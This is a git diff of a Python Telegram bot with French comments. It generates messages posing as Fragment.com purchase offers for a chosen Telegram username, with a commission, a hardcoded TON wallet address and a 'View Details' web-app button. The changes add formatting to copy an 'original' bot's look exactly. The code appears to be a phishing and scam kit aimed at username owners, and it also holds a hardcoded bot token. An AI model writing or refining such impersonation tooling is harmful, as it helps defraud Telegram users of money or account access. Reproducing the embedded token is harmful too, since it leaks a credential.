@@ -8,6 +8,7 @@ from urllib.parse import urlparse, parse_qs
 import threading
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, MessageEntity, WebAppInfo
 from telegram.ext import Application, InlineQueryHandler, ContextTypes
+from telegram import InlineQueryResultArticle, InputTextMessageContent
 
 # Configuration
 BOT_TOKEN = '7975400880:AAFMJ5ya_sMdLLMb7OjSbMYiBr3IhZikE6c'
@@ -51,12 +52,13 @@ def get_ton_price():
             return 5.50
 
 def generate_fragment_message(username, ton_amount):
-    """Génère le message Fragment - VERSION SIMPLIFIÉE QUI FONCTIONNE"""
+    """Génère le message Fragment avec formatage identique au bot original"""
     try:
         print(f"🔧 DEBUG: Début génération pour {username} - {ton_amount} TON")
         
-        # Prix TON actuel
+        # Prix TON actuel - récupération en temps réel
         ton_price = get_ton_price()
+        print(f"🔧 DEBUG: Prix TON récupéré: {ton_price}")
         
         # Calculs
         price = float(ton_amount)
@@ -64,10 +66,12 @@ def generate_fragment_message(username, ton_amount):
         commission = price * 0.05
         commission_usd = commission * ton_price
         
-        # Adresse wallet
+        print(f"🔧 DEBUG: Calculs - Prix: {price} TON (${price_usd:.2f}), Commission: {commission} TON (${commission_usd:.2f})")
+        
+        # Adresse wallet pour le lien cliquable
         wallet_address = "UQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XDPR"
         
-        # Message Fragment - EXACTEMENT comme la version qui marche
+        # Message Fragment EXACT (copié de votre version)
         fragment_message = f"""We have received a purchase request for your username @{username} via Fragment.com. Below are the transaction details:
 
 • Offer Amount: 💎{price:g} (${price_usd:.2f} USD)
@@ -84,43 +88,67 @@ Important:
 • Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
 • If you choose not to proceed, simply ignore this message."""
 
-        # PAS D'ENTITÉS pour éviter les erreurs - comme la version qui marche
-        entities = []
+        print(f"🔧 DEBUG: Message généré (longueur: {len(fragment_message)})")
         
-        # Bouton avec paramètres
-        webapp_url = f"{WEBAPP_URL}?user={username}&price={price:g}"
+        # Création des entités pour le formatage (identique à votre version)
+        entities = [
+            MessageEntity(type=MessageEntity.BOLD, offset=57, length=len(username)+1),
+            MessageEntity(type=MessageEntity.BOLD, offset=fragment_message.find("• Offer Amount:"), length=15),
+            MessageEntity(type=MessageEntity.BOLD, offset=fragment_message.find("• Commission:"), length=13),
+            MessageEntity(type=MessageEntity.BOLD, offset=fragment_message.find("Additional Information:"), length=23),
+            MessageEntity(type=MessageEntity.BOLD, offset=fragment_message.find("Important:"), length=10),
+        ]
+        
+        # Ajout de l'entité pour le lien wallet
+        wallet_start = fragment_message.find(wallet_address)
+        if wallet_start != -1:
+            wallet_url = f"https://tonviewer.com/{wallet_address}"
+            entities.append(MessageEntity(
+                type=MessageEntity.TEXT_LINK,
+                offset=wallet_start,
+                length=len(wallet_address),
+                url=wallet_url
+            ))
+        
+        print(f"🔧 DEBUG: {len(entities)} entités créées")
+        
+        # SEULE MODIFICATION : URL du bouton avec paramètres
+        webapp_url_with_params = f"{WEBAPP_URL}?user={username}&price={price:g}"
+        
+        # Création du bouton "View Details" avec paramètres
         keyboard = InlineKeyboardMarkup([[
-            InlineKeyboardButton(
-                "View Details", 
-                web_app=WebAppInfo(url=webapp_url)
-            )
+            InlineKeyboardButton("View Details", web_app=WebAppInfo(url=webapp_url_with_params))
         ]])
         
+        print(f"🔧 DEBUG: Bouton créé avec URL: {webapp_url_with_params}")
         print(f"✅ DEBUG: Message généré avec succès pour {username}")
+        
         return fragment_message, entities, keyboard
         
     except Exception as e:
         print(f"❌ DEBUG: Erreur dans generate_fragment_message: {e}")
+        import traceback
+        traceback.print_exc()
         raise e
 
 async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Gestionnaire des requêtes inline - VERSION SIMPLIFIÉE"""
+    """Gestionnaire pour les requêtes inline"""
     print(f"🔍 DEBUG: inline_query_handler appelé")
     
     try:
-        from telegram import InlineQueryResultArticle, InputTextMessageContent
-        
         query = update.inline_query.query.strip() if update.inline_query.query else ""
         print(f"🔍 DEBUG: Requête reçue: '{query}'")
         
-        # Si pas de requête - ne rien afficher
+        # Réponse vide si pas de requête
         if not query:
+            print("🔍 DEBUG: Requête vide - pas de résultats")
             await update.inline_query.answer([], cache_time=0)
             return
-        
-        # Parsing simple
+            
+        # Parsing de la requête
         parts = query.split()
         if len(parts) < 2:
+            print(f"🔍 DEBUG: Pas assez de paramètres ({len(parts)}) - pas de résultats")
             await update.inline_query.answer([], cache_time=0)
             return
         
@@ -129,49 +157,72 @@ async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYP
         try:
             ton_amount = float(parts[1])
             if ton_amount <= 0:
-                raise ValueError("Montant invalide")
-        except ValueError:
+                raise ValueError("Montant négatif ou zéro")
+        except ValueError as ve:
+            print(f"🔍 DEBUG: Montant invalide '{parts[1]}': {ve}")
             await update.inline_query.answer([], cache_time=0)
             return
         
-        print(f"✅ DEBUG: Paramètres validés: '{username}' - {ton_amount} TON")
+        print(f"✅ DEBUG: Paramètres validés: username='{username}', ton_amount={ton_amount}")
         
-        # Génération du message - SIMPLE
-        fragment_message, entities, keyboard = generate_fragment_message(username, ton_amount)
+        # Génération du message Fragment
+        try:
+            fragment_message, entities, keyboard = generate_fragment_message(username, ton_amount)
+            print(f"🔧 DEBUG: Message Fragment généré avec succès")
+        except Exception as gen_error:
+            print(f"❌ DEBUG: Erreur génération message: {gen_error}")
+            await update.inline_query.answer([], cache_time=0)
+            return
         
-        # Prix pour affichage
+        # Calcul du prix actuel pour l'affichage
         current_ton_price = get_ton_price()
         current_usd_value = ton_amount * current_ton_price
         
-        # Création du résultat - SIMPLE
-        results = [
-            InlineQueryResultArticle(
-                id=f"deal_{username}_{ton_amount}_{int(time.time())}",
-                title=f"Fragment Deal: @{username}",
-                description=f"💎 {ton_amount:g} TON (${current_usd_value:.2f} USD)",
-                input_message_content=InputTextMessageContent(
-                    fragment_message,
-                    disable_web_page_preview=True
-                ),
-                reply_markup=keyboard
-            )
-        ]
+        print(f"💰 DEBUG: Prix d'affichage: {ton_amount} TON = ${current_usd_value:.2f} USD")
         
-        await update.inline_query.answer(results, cache_time=0)
-        print(f"✅ Réponse inline envoyée: {username} - {ton_amount} TON (${current_usd_value:.2f})")
+        # Création du résultat inline
+        try:
+            results = [
+                InlineQueryResultArticle(
+                    id=f"deal_{username}_{ton_amount}_{int(time.time())}",
+                    title=f"Fragment Deal: @{username}",
+                    description=f"💎 {ton_amount:g} TON (${current_usd_value:.2f} USD)",
+                    input_message_content=InputTextMessageContent(
+                        fragment_message,
+                        entities=entities,
+                        disable_web_page_preview=True
+                    ),
+                    reply_markup=keyboard
+                )
+            ]
+            
+            print(f"🔧 DEBUG: Résultat inline créé (ID: deal_{username}_{ton_amount}_{int(time.time())})")
+            
+            # Envoi de la réponse
+            await update.inline_query.answer(results, cache_time=0)
+            print(f"✅ Réponse inline envoyée: {username} - {ton_amount} TON (${current_usd_value:.2f})")
+            
+        except Exception as result_error:
+            print(f"❌ DEBUG: Erreur création résultat inline: {result_error}")
+            import traceback
+            traceback.print_exc()
+            await update.inline_query.answer([], cache_time=0)
         
     except Exception as e:
-        print(f"❌ Erreur dans inline_query_handler: {e}")
+        print(f"❌ Erreur critique dans inline_query_handler: {e}")
+        import traceback
+        traceback.print_exc()
         await update.inline_query.answer([], cache_time=0)
 
 class WebhookHandler(BaseHTTPRequestHandler):
-    """Gestionnaire webhook HTTP simple"""
+    """Gestionnaire pour les webhooks Telegram"""
     
     def do_POST(self):
-        """Gestion des requêtes POST"""
+        """Gestion des requêtes POST du webhook"""
         global app, event_loop
         
         try:
+            # Vérification du chemin
             if self.path != f'/{BOT_TOKEN}':
                 self.send_response(404)
                 self.end_headers()
@@ -184,7 +235,7 @@ class WebhookHandler(BaseHTTPRequestHandler):
             # Parse JSON
             update_data = json.loads(post_data.decode('utf-8'))
             
-            # Traitement asynchrone
+            # Traitement asynchrone dans l'event loop principal
             if app and event_loop:
                 asyncio.run_coroutine_threadsafe(
                     process_update(update_data),
@@ -203,12 +254,12 @@ class WebhookHandler(BaseHTTPRequestHandler):
             self.end_headers()
     
     def do_GET(self):
-        """Page de status simple"""
+        """Page de status pour vérifier que le bot fonctionne"""
         self.send_response(200)
         self.send_header('Content-Type', 'text/plain')
         self.end_headers()
         
-        status = f"✅ Bot Status: Online\n🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S UTC')}\n📱 Web App: {WEBAPP_URL}"
+        status = f"✅ Bot Status: Online\n🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S UTC')}\n📱 Web App (Intégrée): {WEBAPP_URL}"
         self.wfile.write(status.encode('utf-8'))
     
     def log_message(self, format, *args):
